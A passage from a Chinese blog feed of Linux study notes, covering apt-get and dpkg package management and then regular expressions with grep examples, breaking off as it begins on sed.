Tool（高级包装工具）的缩写，是Debian及其派生发行版的软件包管理器，APT可以自动下载，配置，安装二进制或者源代码格式的软件包，因此简化了Unix系统上管理软件的过程。APT最早被设计成dpkg的前端，用来处理deb格式的软件包。现在经过APT-RPM组织修改，APT已经可以安装在支持RPM的系统管理RPM包。这个包管理器包含以 <code>apt-</code> 开头的多个工具，如 <code>apt-get</code> <code>apt-cache</code> <code>apt-cdrom</code> 等，在Debian系列的发行版中使用。</p></blockquote><ul><li>当在执行安装操作时，首先<code>apt-get</code> 工具会在<strong>本地</strong>的一个数据库中搜索软件的相关信息，并根据这些信息在相关的服务器上下载软件安装。</li><li>我们需要定期从服务器上下载一个软件包列表，系统会使用 <code>sudo apt-get update</code> 命令来保持本地的软件包列表是最新的（有时你也需要手动执行这个操作，比如更换了软件源），而这个表里会有<strong>软件依赖</strong>信息的记录，对于软件依赖，比如：安装 <code>w3m</code> 软件的时候，而这个软件需要 <code>libgc1c2</code> 这个软件包才能正常工作，这个时候 <code>apt-get</code> 在安装软件的时候会将其一并安装，以保证 <code>w3m</code> 能正常工作。</li></ul><h3 id="apt-get">apt-get</h3><ul><li><code>apt-get</code> 是用于处理 <code>apt</code>包的公用程序集，我们可以用它来在线安装、卸载和升级软件包等，下面列出一些<code>apt-get</code>包含的常用的一些工具：</li></ul><table><thead><tr><th>工具</th><th>说明</th></tr></thead><tbody><tr><td><code>install</code></td><td>其后加上软件包名，用于安装一个软件包</td></tr><tr><td><code>update</code></td><td>从软件源镜像服务器上下载/更新用于更新本地软件源的软件包列表</td></tr><tr><td><code>upgrade</code></td><td>升级本地可更新的全部软件包，但存在依赖问题时将不会升级，通常会在更新之前执行一次<code>update</code></td></tr><tr><td><code>dist-upgrade</code></td><td>解决依赖关系并升级(存在一定危险性)</td></tr><tr><td><code>remove</code></td><td>移除已安装的软件包，包括与被移除软件包有依赖关系的软件包，但不包含软件包的配置文件</td></tr><tr><td><code>autoremove</code></td><td>移除之前被其他软件包依赖，但现在不再被使用的软件包</td></tr><tr><td><code>purge</code></td><td>与remove相同，但会完全移除软件包，包含其配置文件</td></tr><tr><td><code>clean</code></td><td>移除下载到本地的已经安装的软件包，默认保存在/var/cache/apt/archives/</td></tr><tr><td><code>autoclean</code></td><td>移除已安装的软件的旧版本软件包</td></tr></tbody></table><ul><li><code>apt-get</code>的常用参数如下：</li></ul><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-y</code></td><td>自动回应是否安装软件包的选项，在一些自动化安装脚本中使用这个参数将十分有用</td></tr><tr><td><code>-s</code></td><td>模拟安装</td></tr><tr><td><code>-q</code></td><td>静默安装方式，指定多个<code>q</code>或者<code>-q=#</code>,#表示数字，用于设定静默级别，这在你不想要在安装软件包时屏幕输出过多时很有用</td></tr><tr><td><code>-f</code></td><td>修复损坏的依赖关系</td></tr><tr><td><code>-d</code></td><td>只下载不安装</td></tr><tr><td><code>--reinstall</code></td><td>重新安装已经安装但可能存在问题的软件包</td></tr><tr><td><code>--install-suggests</code></td><td>同时安装APT给出的建议安装的软件包</td></tr></tbody></table><h3 id="使用apt-get安装软件包">使用apt-get安装软件包</h3><ul><li><p>就像前面演示的一样，只需要执行<code>apt-get install &lt;软件包名&gt;</code>即可。</p></li><li><p>但有时需要重新对软件包进行安装，比如在系统被破坏、软件配置错误等时候，则可以加上<code>--reinstall</code>参数进行重新安装，比如对前面安装的<code>w3m</code>进行重装：</p>  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> <span class="comment">--reinstall install w3m</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231201180918092.png" alt="image-20231201180918092"></p></li></ul><h3 id="更换软件源与软件升级">更换软件源与软件升级</h3><ul><li><p>如果希望更换软件的下载源，可以到<code>/etc/apt</code>目录下修改<code>sources.list</code>文件：</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano <span class="regexp">/etc/</span>apt/sources.list</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231201181658888.png" alt="image-20231201181658888"></p></li><li><p>更新软件源可以使用如下命令：</p>  <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231201181015727.png" alt="image-20231201181015727"></p></li><li><p>对所有没有依赖问题的软件包进行升级：</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> upgrade</span><br></pre></td></tr></table></figure></li><li><p>全部升级并解决依赖关系：</p>  <figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> <span class="built_in">dist</span>-upgrade</span><br></pre></td></tr></table></figure></li></ul><h3 id="卸载软件">卸载软件</h3><ul><li><p>现在想卸载掉<code>w3m</code>这个软件，可以使用同样的命令，带上<code>remove</code>参数即可完成卸载：</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> <span class="built_in">remove</span> w3m</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231201182239343.png" alt="image-20231201182239343"></p></li><li><p>如果希望不保留配置文件的移除，可以使用：</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> purge w3m</span><br></pre></td></tr></table></figure><p>或者：</p>  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> <span class="comment">--purge remove</span></span><br></pre></td></tr></table></figure></li><li><p>同时也可以移除不再需要的被依赖软件包：</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> autoremove</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231201182505496.png" alt="image-20231201182505496"></p></li></ul><h3 id="软件搜索">软件搜索</h3><ul><li><p>如果不确定需要的软件是否已经安装，可以使用搜索功能：</p>  <figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-cache search soft<span class="symbol">name1</span> soft<span class="symbol">name2</span> soft<span class="symbol">name3</span>……</span><br></pre></td></tr></table></figure><p><code>apt-cache</code> 命令是针对本地数据进行相关操作的工具，<code>search</code> 顾名思义在本地的数据库中寻找有关 <code>softname1</code> <code>softname2</code> …… 相关软件的信息。</p></li></ul><h2 id="使用dpkd安装">使用dpkd安装</h2><h3 id="安装deb软件包">安装deb软件包</h3><ul><li>我们可以经常在网络上见到以<code>deb</code>形式打包的软件包，这些软件包就需要使用<code>dpkg</code>命令来安装，常用参数如下：</li></ul><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-i</code></td><td>安装指定deb包</td></tr><tr><td><code>-R</code></td><td>后面加上目录名，用于安装该目录下的所有deb安装包</td></tr><tr><td><code>-r</code></td><td>remove，移除某个已安装的软件包</td></tr><tr><td><code>-I</code></td><td>显示<code>deb</code>包文件的信息</td></tr><tr><td><code>-s</code></td><td>显示已安装软件的信息</td></tr><tr><td><code>-S</code></td><td>搜索已安装的软件包</td></tr><tr><td><code>-L</code></td><td>显示已安装软件包的目录信息</td></tr></tbody></table><ul><li><p>首先使用<code>apt-get</code>加上<code>-d</code>参数只下载不安装，下载<code>emacs</code>编辑器的deb包：</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> update</span><br><span class="line">sudo apt-<span class="built_in">get</span> -d install -y emacs</span><br></pre></td></tr></table></figure></li><li><p>下载完成后，可以在<code>/var/cache/apt/archives/</code>查看下载的内容：</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls <span class="regexp">/var/</span>cache<span class="regexp">/apt/</span>archives/</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231201190916849.png" alt="image-20231201190916849"></p></li><li><p>将第一个文件拷贝到用户目录下，并使用<code>dpkg</code>安装：</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cp</span> /var/cache/apt/archives/emacs24_24.<span class="number">5</span>+<span class="number">1</span>-<span class="number">6</span>ubuntu1.<span class="number">1</span>_amd64.deb ~</span><br><span class="line"><span class="attribute">sudo</span> dpkg -I emacs24_24.<span class="number">5</span>+<span class="number">1</span>-<span class="number">6</span>ubuntu1.<span class="number">1</span>_amd64.deb</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231201191438879.png" alt="image-20231201191438879"></p></li><li><p>但如果安装的软件包还有额外依赖，那么意味着直接使用<code>dpkg</code>命令会出现一些问题，因为<code>dpkg</code>无法解决依赖关系问题：</p>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> dpkg -i emacs24_24.<span class="number">5</span>+<span class="number">1</span>-<span class="number">6</span>ubuntu1.<span class="number">1</span>_amd64.deb</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231201191718630.png" alt="image-20231201191718630"></p></li><li><p>为了解决这个问题，可以使用<code>apt-get</code>的<code>-f</code>参数修复依赖关系的安装：</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> update</span><br><span class="line">sudo apt-<span class="built_in">get</span> -f install -y</span><br></pre></td></tr></table></figure></li></ul><h3 id="查看已安装软件包的安装目录">查看已安装软件包的安装目录</h3><ul><li><p>如果希望知道每个软件分别安装到了什么地方，可以使用<code>dpkg</code>的<code>-L</code>参数查看deb包目录信息：</p>  <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> dpkg -L emacs24</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231201192702116.png" alt="image-20231201192702116"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux正则表达式相关命令</title>
      <link href="/posts/9505e307.html"/>
      <url>/posts/9505e307.html</url>
      
        <content type="html"><![CDATA[<h2 id="正则表达式">正则表达式</h2><blockquote><p><strong>正则表达式</strong>：计算机科学的一个概念，使用单个字符串来描述、匹配一系列符合某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些符合某个模式的文本。</p></blockquote><h3 id="选择">选择</h3><ul><li><code>|</code>竖直分隔符表示选择，例如<code>boy|girl</code>可以匹配<code>boy</code>或者<code>girl</code></li></ul><h3 id="数量限定">数量限定</h3><ul><li><code>+</code>表示前面的字符必须出现至少一次（1次或多次），例如<code>ab+cd</code>，可以匹配<code>abcd</code>，<code>abbcd</code>等</li><li><code>?</code>表示前面的字符最多出现一次（0次或1次），例如<code>colou?r</code>，可以匹配<code>color</code>或者<code>colour</code></li><li><code>*</code>星号代表前面的字符可以不出现，也可以出现一次或者多次（0次、1次或多次），例如<code>0*42</code>可以匹配<code>42</code>、<code>042</code>、<code>0042</code>、<code>00042</code>等</li></ul><h3 id="范围和优先级">范围和优先级</h3><ul><li><code>()</code>圆括号可以用来定义模式字符串的范围和优先级，这可以简单的理解为是否将括号内的模式串作为一个整体。例如，<code>gr(a|e)y</code>等价于<code>gray|grey</code>（这里体现了优先级，竖直分隔符用于选择<code>a</code>或者<code>e</code>而不是<code>gra</code>和<code>ey</code>），<code>(grand)?father</code>匹配<code>father</code>和<code>grandfather</code>（这里体现了范围，<code>?</code>将圆括号内容作为一个整体匹配）</li></ul><h3 id="更多语法">更多语法</h3><table><thead><tr><th style="text-align:center">字符</th><th>描述</th></tr></thead><tbody><tr><td style="text-align:center">\</td><td><strong>将下一个字符标记为一个特殊字符、或一个原义字符。</strong> 例如，<code>n</code>匹配字符<code>n</code>，<code>\n</code>匹配一个换行符，序列<code>\\</code>匹配<code>\</code>而<code>\(</code>则匹配<code>(</code></td></tr><tr><td style="text-align:center">^</td><td><strong>匹配输入字符串的开始位置</strong></td></tr><tr><td style="text-align:center">$</td><td><strong>匹配输入字符串的结束位置</strong></td></tr><tr><td style="text-align:center">{n}</td><td><strong>匹配确定的n次（n为非负整数）</strong>。例如，<code>o&#123;2&#125;</code>不能匹配<code>Bob</code>中的<code>o</code>，但是能匹配<code>food</code>中的两个<code>o</code></td></tr><tr><td style="text-align:center">{n,}</td><td><strong>至少匹配n次（n为非负整数）</strong>。例如，<code>o&#123;2,&#125;</code>不能匹配<code>Bob</code>中的<code>o</code>，但能匹配<code>foooood</code>中的所有<code>o</code>。<code>o&#123;1,&#125;</code>等价于<code>o+</code>，<code>o&#123;0,&#125;</code>则等价于<code>o*</code></td></tr><tr><td style="text-align:center">{n,m}</td><td><strong>最少匹配n次且最多匹配m次（m和n均为非负整数，其中n&lt;=m）。</strong> 例如，<code>o&#123;1,3&#125;</code>将匹配<code>fooooood</code>中的前三个<code>o</code>。<code>o&#123;0,1&#125;</code>等价于<code>o?</code>。请注意在逗号和两个数之间不能有空格</td></tr><tr><td style="text-align:center">*</td><td><strong>匹配前面的子表达式零次或多次</strong>。例如，<code>zo</code>能匹配<code>z</code>、<code>zo</code>以及<code>zoo</code>。<code>*</code>等价于<code>&#123;0,&#125;</code></td></tr><tr><td style="text-align:center">+</td><td><strong>匹配前面的子表达式一次或多次</strong>。例如，<code>zo+</code>能匹配<code>zo</code>以及<code>zoo</code>，但不能匹配<code>z</code>。<code>+</code>等价于<code>&#123;1,&#125;</code></td></tr><tr><td style="text-align:center">?</td><td><strong>匹配前面的子表达式零次或一次</strong>。例如，<code>do(es)?</code>可以匹配<code>do</code>或<code>does</code>中的<code>do</code>。<code>?</code>等价于<code>&#123;0,1&#125;</code></td></tr><tr><td style="text-align:center">限制符+?</td><td>当该字符紧跟在任何一个其他限制符（<code>*</code>、<code>+</code>、<code>?</code>、<code>&#123;n&#125;</code>、<code>&#123;n,&#125;</code>、<code>&#123;n,m&#125;</code>）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串<code>oooo</code>，<code>o+?</code>将匹配单个<code>o</code>，而<code>o+</code>将匹配所有<code>o</code></td></tr><tr><td style="text-align:center">.</td><td><strong>匹配除<code>\n</code>之外的任何单个字符</strong>。要匹配包括<code>\n</code>在内的任何字符，请使用像(.|\n)的模式</td></tr><tr><td style="text-align:center">(pattern)</td><td><strong>匹配pattern并获取这一匹配的子字符串</strong>。该子字符串用于向后引用。要匹配圆括号字符，请使用<code>\(</code>或<code>\)</code></td></tr><tr><td style="text-align:center">x|y</td><td><strong>匹配x或y</strong>。例如z|food能匹配<code>z</code>或<code>food</code>，(z|f)ood则匹配<code>zood</code>或<code>food</code></td></tr><tr><td style="text-align:center">[xyz]</td><td>字符集合，<strong>匹配所包含的任意一个字符</strong>。例如，<code>[abc]</code>可以匹配<code>plain</code>中的<code>a</code>。其中特殊字符仅有反斜线<code>\</code>保持特殊含义，用于转义字符。其它特殊字符如星号、加号、各种括号等均作为普通字符。脱字符<code>^</code>如果出现在首位则表示负值字符集合，如果出现在字符串中间就仅作为普通字符。<strong>连字符<code>-</code> 如果出现在字符串中间表示字符范围描述；如果出现在首位则仅作为普通字符</strong></td></tr><tr><td style="text-align:center">[^xyz]</td><td>排除型字符集合，<strong>匹配未列出的任意字符。</strong> 例如，<code>[^abc]</code>可以匹配<code>plain</code>中的<code>plin</code></td></tr><tr><td style="text-align:center">[a-z]</td><td>字符范围，<strong>匹配指定范围内的任意字符。</strong> 例如，<code>[a-z]</code>可以匹配<code>a</code>到<code>z</code>范围内的任意小写字母字符</td></tr><tr><td style="text-align:center">[^a-z]</td><td>排除型的字符范围，<strong>匹配任何不在指定范围内的任意字符</strong>。例如，<code>[^a-z]</code>可以匹配任何不在<code>a</code>到<code>z</code>范围内的任意字符</td></tr></tbody></table><h3 id="优先级">优先级</h3><table><thead><tr><th>优先级</th><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>高</td><td>\</td><td>转义符</td></tr><tr><td></td><td>(), (?:), (?=), []</td><td>括号和中括号</td></tr><tr><td></td><td>*、+、?、{n}、{n,}、{n,m}</td><td>限定符</td></tr><tr><td></td><td>^、$、\任何元字符</td><td>定位点和序列</td></tr><tr><td>低</td><td>|</td><td>选择</td></tr></tbody></table><h2 id="相关命令">相关命令</h2><h3 id="grep模式匹配命令">grep模式匹配命令</h3><h4 id="基本操作">基本操作</h4><ul><li><code>grep</code>命令用于打印输出文本中匹配的模式串，使用正则表达式作为匹配的条件。这个命令支持三种正则表达式引擎，用三种参数指定，在不使用perl语言的情况下用的大多数正则表达式都是前两种：</li></ul><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>-E</code></td><td style="text-align:center">POSIX扩展正则表达式，ERE</td></tr><tr><td style="text-align:center"><code>-G</code></td><td style="text-align:center">POSIX基本正则表达式，BRE</td></tr><tr><td style="text-align:center"><code>-P</code></td><td style="text-align:center">Perl正则表达式，PCRE</td></tr></tbody></table><ul><li><code>grep</code>命令有如下常用参数：</li></ul><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>-b</code></td><td style="text-align:left">将二进制文件作为文本来进行匹配</td></tr><tr><td style="text-align:center"><code>-c</code></td><td style="text-align:left">统计以模式匹配的数目</td></tr><tr><td style="text-align:center"><code>-i</code></td><td style="text-align:left">忽略大小写</td></tr><tr><td style="text-align:center"><code>-n</code></td><td style="text-align:left">显示匹配文本所在行的行号</td></tr><tr><td style="text-align:center"><code>-v</code></td><td style="text-align:left">反选，输出不匹配行的内容</td></tr><tr><td style="text-align:center"><code>-r</code></td><td style="text-align:left">递归匹配查找</td></tr><tr><td style="text-align:center"><code>-A n</code></td><td style="text-align:left">n为正整数，表示after的意思，除了列出匹配行之外，还列出后面的n行</td></tr><tr><td style="text-align:center"><code>-B n</code></td><td style="text-align:left">n为正整数，表示before的意思，除了列出匹配行之外，还列出前面的n行</td></tr><tr><td style="text-align:center"><code>--color=auto</code></td><td style="text-align:left">将输出中的匹配项设置为自动颜色显示</td></tr></tbody></table><h4 id="使用基本正则表达式BRE">使用基本正则表达式BRE</h4><h5 id="位置">位置</h5><ul><li><p>查找<code>/etc/group</code>文件中以<code>shiyanlou</code>开头的行：</p>  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> <span class="string">&#x27;shiyanlou&#x27;</span> <span class="regexp">/etc/g</span>roup</span><br><span class="line"><span class="keyword">grep</span> <span class="string">&#x27;^shiyanlou&#x27;</span> <span class="regexp">/etc/g</span>roup</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124191055543.png" alt="image-20231124191055543"></p></li></ul><h5 id="数量">数量</h5><ul><li><p>匹配以<code>z</code>开头以<code>o</code>结尾的所有字符串：</p>  <figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="symbol">&#x27;zero</span>\nzo\nzoo&#x27; | grep <span class="symbol">&#x27;z</span>.*o&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124191223808.png" alt="image-20231124191223808"></p></li><li><p>将匹配以<code>z</code>开头以<code>o</code>结尾，中间包含一个任意字符的字符串：</p>  <figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="symbol">&#x27;zero</span>\nzo\nzoo&#x27; | grep <span class="symbol">&#x27;z</span>.o&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124191353795.png" alt="image-20231124191353795"></p></li><li><p>将匹配以<code>z</code>开头,以任意多个<code>o</code>结尾的字符串：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;zero\nzo\nzoo&#x27;</span> | <span class="keyword">grep</span> <span class="string">&#x27;zo*&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124191447803.png" alt="image-20231124191447803"></p></li></ul><h5 id="选择-2">选择</h5><ul><li><p><code>grep</code>默认是区分大小写的，接下来对字符串<code>1234\nabcd</code>进行如下操作。</p></li><li><p>匹配所有的小写字母：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1234\nabcd&#x27;</span> | <span class="keyword">grep</span> <span class="string">&#x27;[a-z]&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124191630543.png" alt="image-20231124191630543"></p></li><li><p>匹配所有的数字：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1234\nabcd&#x27;</span> | <span class="keyword">grep</span> <span class="string">&#x27;[0-9]&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1234\nabcd&#x27;</span> | <span class="keyword">grep</span> <span class="string">&#x27;[[:digit:]]&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124191950057.png" alt="image-20231124191950057"></p></li><li><p>匹配所有的小写字母：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1234\nabcd&#x27;</span> | <span class="keyword">grep</span> <span class="string">&#x27;[[:lower:]]&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124192147548.png" alt="image-20231124192147548"></p></li><li><p>匹配所有的大写字母：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1234\nabcd\nABCD&#x27;</span> | <span class="keyword">grep</span> <span class="string">&#x27;[[:upper:]]&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124192246970.png" alt="image-20231124192246970"></p></li><li><p>匹配所有的字母和数字，包括0-9,a-z,A-Z：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1234\nabcd&#x27;</span> | <span class="keyword">grep</span> <span class="string">&#x27;[[:alnum:]]&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124192348521.png" alt="image-20231124192348521"></p></li><li><p>匹配所有的字母：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1234\nabcd&#x27;</span> | <span class="keyword">grep</span> <span class="string">&#x27;[[:alpha:]]&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124192435784.png" alt="image-20231124192435784"></p></li><li><p>完整的特殊符号列表及说明：</p></li></ul><table><thead><tr><th style="text-align:center">特殊符号</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>[:alnum:]</code></td><td>代表英文大小写字母及数字，亦即 0-9, A-Z, a-z</td></tr><tr><td style="text-align:center"><code>[:alpha:]</code></td><td>代表任何英文大小写字母，亦即 A-Z, a-z</td></tr><tr><td style="text-align:center"><code>[:blank:]</code></td><td>代表空白键与 [Tab] 按键两者</td></tr><tr><td style="text-align:center"><code>[:cntrl:]</code></td><td>代表键盘上面的控制按键，亦即包括 CR, LF, Tab, Del… 等等</td></tr><tr><td style="text-align:center"><code>[:digit:]</code></td><td>代表数字而已，亦即 0-9</td></tr><tr><td style="text-align:center"><code>[:graph:]</code></td><td>除了空白字节 (空白键与 [Tab] 按键) 外的其他所有按键</td></tr><tr><td style="text-align:center"><code>[:lower:]</code></td><td>代表小写字母，亦即 a-z</td></tr><tr><td style="text-align:center"><code>[:print:]</code></td><td>代表任何可以被列印出来的字符</td></tr><tr><td style="text-align:center"><code>[:punct:]</code></td><td>代表标点符号 (punctuation symbol)，亦即：&quot; ’ ? ! ; : # $…</td></tr><tr><td style="text-align:center"><code>[:upper:]</code></td><td>代表大写字母，亦即 A-Z</td></tr><tr><td style="text-align:center"><code>[:space:]</code></td><td>任何会产生空白的字符，包括空白键, [Tab], CR 等等</td></tr><tr><td style="text-align:center"><code>[:xdigit:]</code></td><td>代表 16 进位的数字类型，因此包括： 0-9, A-F, a-f 的数字与字节</td></tr></tbody></table><h5 id="排除">排除</h5><ul><li><p>在字符串中排除字符：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;geek\ngood&#x27;</span> | <span class="keyword">grep</span> <span class="string">&#x27;[^o]&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124192843061.png" alt="image-20231124192843061"></p>  <div class="tip "><p>当<code>^</code>放到中括号内为排除字符，否则表示行首</p></div></li></ul><h4 id="使用扩展正则表达式ERE">使用扩展正则表达式ERE</h4><div class="tip "><p>通过<code>grep</code>使用扩展正则表达式需要加上<code>-E</code>参数，或使用<code>egrep</code></p></div><h5 id="数量-2">数量</h5><ul><li><p>只匹配<code>zo</code>：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;zero\nzo\nzoo&#x27;</span> | <span class="keyword">grep</span> -E <span class="string">&#x27;zo&#123;1&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124193420972.png" alt="image-20231124193420972"></p></li><li><p>匹配以<code>zo</code>开头的所有单词：</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;zero\nzo\nzoo&#x27;</span> | <span class="keyword">grep</span> -E <span class="string">&#x27;zo&#123;1,&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124193513268.png" alt="image-20231124193513268"></p></li></ul><h5 id="选择-3">选择</h5><ul><li><p>匹配<code>www.shiyanlou.com</code>和<code>www.google.com</code>：</p>  <figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="symbol">&#x27;www</span>.shiyanlou.com\nwww.baidu.com\nwww.google.com&#x27; | grep -<span class="type">E</span> <span class="symbol">&#x27;www</span>\.(shiyanlou|google)\.com&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124193714766.png" alt="image-20231124193714766"></p></li><li><p>或者匹配不包含<code>baidu</code>的内容：</p>  <figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="symbol">&#x27;www</span>.shiyanlou.com\nwww.baidu.com\nwww.google.com&#x27; | grep -<span class="type">Ev</span> <span class="symbol">&#x27;www</span>\.baidu\.com&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231124193823247.png" alt="image-20231124193823247"></p></li></ul><div class="tip "><p>因为<code>.</code>号有特殊含义，所以需要转义</p></div><h3 id="sed流编辑器">sed流编辑器</h3><ul><li><p><code>sed</code>命令的基本格式如下：</p>  <figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed [参数]... [执行命令] [输入文件]...</span><br></pre></td></tr></table></figure></li></ul><h4 id="常用参数">常用参数</h4><table><thead><tr><th style="text-align:center">参数</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>-n</code></td><td>安静模式，只打印受影响的行，默认打印输入数据的全部内容</td></tr><tr><td style="text-align:center"><code>-e</code></td><td>用于在脚本中添加多个执行命令一次执行，在命令行中执行多个命令通常不需要加该参数</td></tr><tr><td style="text-align:center"><code>-f filename</code></td><td>指定执行filename文件中的命令</td></tr><tr><td 